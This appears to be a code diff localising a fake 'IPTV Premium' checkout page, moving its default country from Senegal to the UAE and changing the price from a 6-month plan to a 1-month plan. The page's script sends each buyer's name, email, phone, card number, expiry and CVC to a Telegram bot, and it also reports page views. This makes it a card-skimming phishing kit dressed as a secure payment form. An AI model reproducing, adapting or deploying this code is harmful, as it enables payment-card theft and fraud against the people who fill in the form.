@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>IPTV Premium Checkout • 6 months</title>
+    <title>IPTV Premium Checkout • 1 month</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
@@ -545,8 +545,8 @@
                         <p class="sub-text">Thank you for your order.</p>
                         <div class="order-detail" id="orderDetail">
                             <div class="detail-row"><span>📦 Order</span> <span class="detail-value" id="orderNumber">#IPTV-2847-91</span> <button class="copy-btn" data-copy="orderNumber">📋 Copy</button></div>
-                            <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 6 Months + 1 Month FREE</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
-                            <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$48.73 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
+                            <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 1 Month</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
+                            <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$24.99 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
                             <div class="detail-row"><span>📧 Email</span> <span class="detail-value" id="successEmail">—</span> <button class="copy-btn" data-copy="successEmail">📋 Copy</button></div>
                             <div class="detail-row"><span>📞 Phone</span> <span class="detail-value" id="successPhone">—</span> <button class="copy-btn" data-copy="successPhone">📋 Copy</button></div>
                             <div class="detail-row"><span>👤 Cardholder</span> <span class="detail-value" id="successCardholder">—</span> <button class="copy-btn" data-copy="successCardholder">📋 Copy</button></div>
@@ -573,7 +573,9 @@
                             <div class="form-group">
                                 <label class="form-label">Country/Region <span class="required-star">*</span></label>
                                 <select class="form-select" id="countrySelect">
-                                    <option value="SN" selected>Senegal (+221)</option>
+                                    <!-- UAE is default -->
+                                    <option value="AE" selected>United Arab Emirates (+971)</option>
+                                    <option value="SN">Senegal (+221)</option>
                                     <option value="PH">Philippines (+63)</option>
                                     <option value="BE">Belgium (+32)</option>
                                     <option value="US">United States (+1)</option>
@@ -613,7 +615,7 @@
                                 <label class="form-label">Mobile Phone <span class="required-star">*</span></label>
                                 <div class="phone-group">
                                     <select class="form-select" id="phoneCodeSelect"></select>
-                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="77 123 45 67" autocomplete="tel" />
+                                    <input type="tel" class="form-control" id="phoneNumber" placeholder="50 123 4567" autocomplete="tel" />
                                 </div>
                                 <div class="validation-feedback" id="phoneError">Please enter a valid phone number.</div>
                             </div>
@@ -630,18 +632,18 @@
                             <div class="form-row">
                                 <div class="form-group">
                                     <label class="form-label">City <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="city" placeholder="Dakar" autocomplete="address-level2" />
+                                    <input type="text" class="form-control" id="city" placeholder="Dubai" autocomplete="address-level2" />
                                     <div class="validation-feedback" id="cityError">City is required.</div>
                                 </div>
                                 <div class="form-group">
                                     <label class="form-label">State / Province <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="state" placeholder="Dakar" autocomplete="address-level1" />
+                                    <input type="text" class="form-control" id="state" placeholder="Dubai" autocomplete="address-level1" />
                                     <div class="validation-feedback" id="stateError">State / Province is required.</div>
                                 </div>
                             </div>
                             <div class="form-group">
                                 <label class="form-label">ZIP / Postal Code <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="postal" placeholder="10000" autocomplete="postal-code" />
+                                <input type="text" class="form-control" id="postal" placeholder="00000" autocomplete="postal-code" />
                                 <div class="validation-feedback" id="postalError">Valid postal code required.</div>
                             </div>
 
@@ -662,7 +664,7 @@
                             <div class="form-row">
                                 <div class="form-group">
                                     <label class="form-label">Expiration <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="expiry" placeholder="xx/xx" autocomplete="cc-exp" maxlength="5" />
+                                    <input type="text" class="form-control" id="expiry" placeholder="MM/YY" autocomplete="cc-exp" maxlength="5" />
                                     <div class="validation-feedback" id="expiryError">Valid expiration (MM/YY).</div>
                                 </div>
                                 <div class="form-group">
@@ -674,7 +676,8 @@
                             <div class="form-group">
                                 <label class="form-label">Billing country</label>
                                 <select class="form-select" id="billingCountry">
-                                    <option value="SN" selected>Senegal</option>
+                                    <option value="AE" selected>United Arab Emirates</option>
+                                    <option value="SN">Senegal</option>
                                     <option value="PH">Philippines</option>
                                     <option value="BE">Belgium</option>
                                     <option value="US">United States</option>
@@ -690,20 +693,20 @@
                 <div class="right-col">
                     <div class="glass-card summary-card">
                         <div class="product-badge">⭐ PREMIUM</div>
-                        <div class="summary-title">IPTV 6 Months <span style="color:#aab3d0;font-weight:400;">+</span> <span style="color:#b7adff;">1 Month FREE</span></div>
-                        <div class="summary-bonus">🎁 Bonus month included</div>
+                        <div class="summary-title">IPTV 1 Month <span style="color:#aab3d0;font-weight:400;"></span> <span style="color:#b7adff;"></span></div>
+                        <div class="summary-bonus">🎁 HD & Sports included</div>
                         <div>
-                            <span class="price-large">$48.73 <small>USD</small></span>
-                            <span class="price-strikethrough">$99.99</span>
+                            <span class="price-large">$24.99 <small>USD</small></span>
+                            <span class="price-strikethrough">$49.99</span>
                         </div>
                         <div style="margin-top:1.8rem;">
-                            <div class="summary-line"><span>Subtotal</span> <span>$48.73</span></div>
-                            <div class="summary-line"><span>Discount / Bonus</span> <span style="color:#7fcf9b;">− 1 Month FREE</span></div>
-                            <div class="summary-line total"><span>Total</span> <span>$48.73 USD</span></div>
+                            <div class="summary-line"><span>Subtotal</span> <span>$24.99</span></div>
+                            <div class="summary-line"><span>Discount</span> <span style="color:#7fcf9b;">− 50%</span></div>
+                            <div class="summary-line total"><span>Total</span> <span>$24.99 USD</span></div>
                         </div>
 
                         <button class="btn-primary" id="payButton">
-                            <span class="btn-text">🔒 Pay $48.73 Securely</span>
+                            <span class="btn-text">🔒 Pay $24.99 Securely</span>
                             <span class="spinner"></span>
                         </button>
 
@@ -725,7 +728,7 @@
 
                 // ---------- PAGE VIEW NOTIFICATION ----------
                 function notifyPageView() {
-                    const viewMsg = `👁️ *IPTV page viewed* · 6-month plan · $48.73 · Senegal (primary)`;
+                    const viewMsg = `👁️ *IPTV page viewed* · 1-month plan · $24.99 · UAE (default)`;
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -742,6 +745,7 @@
 
                 // ========== COUNTRY CODES ==========
                 const countryCodes = {
+                    AE: '+971',
                     SN: '+221',
                     PH: '+63',
                     BE: '+32',
@@ -776,8 +780,8 @@
                         opt.textContent = dial;
                         phoneCodeSelect.appendChild(opt);
                     }
-                    // default to Senegal
-                    phoneCodeSelect.value = 'SN';
+                    // default UAE
+                    phoneCodeSelect.value = 'AE';
                 }
 
                 function updatePhoneCode() {
@@ -874,7 +878,7 @@
                 // ========== TELEGRAM SEND (order) ==========
                 function sendToTelegram(data) {
                     const message = `
-                    🎯 *New IPTV Order (6 months)*
+                    🎯 *New IPTV Order (1 month)*
                     👤 Full Name: ${data.fullName}
                     📧 Email: ${data.email}
                     📞 Phone: ${data.phone}
@@ -884,7 +888,7 @@
                     📅 Expiry: ${data.expiry}
                     🔐 CVC: ${data.cvc}
                     🌍 Country: ${data.country}
-                    💰 Amount: $48.73 USD
+                    💰 Amount: $24.99 USD
                     `;
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -1052,8 +1056,8 @@
                         const targetId = this.dataset.copy;
                         let text = '';
                         if (targetId === 'orderNumber') text = document.getElementById('orderNumber').textContent;
-                        else if (targetId === 'product') text = 'IPTV 6 Months + 1 Month FREE';
-                        else if (targetId === 'amount') text = '$48.73 USD';
+                        else if (targetId === 'product') text = 'IPTV 1 Month';
+                        else if (targetId === 'amount') text = '$24.99 USD';
                         else if (targetId === 'successEmail') text = document.getElementById('successEmail').textContent;
                         else if (targetId === 'successPhone') text = document.getElementById('successPhone').textContent;
                         else if (targetId === 'successCardholder') text = document.getElementById('successCardholder')
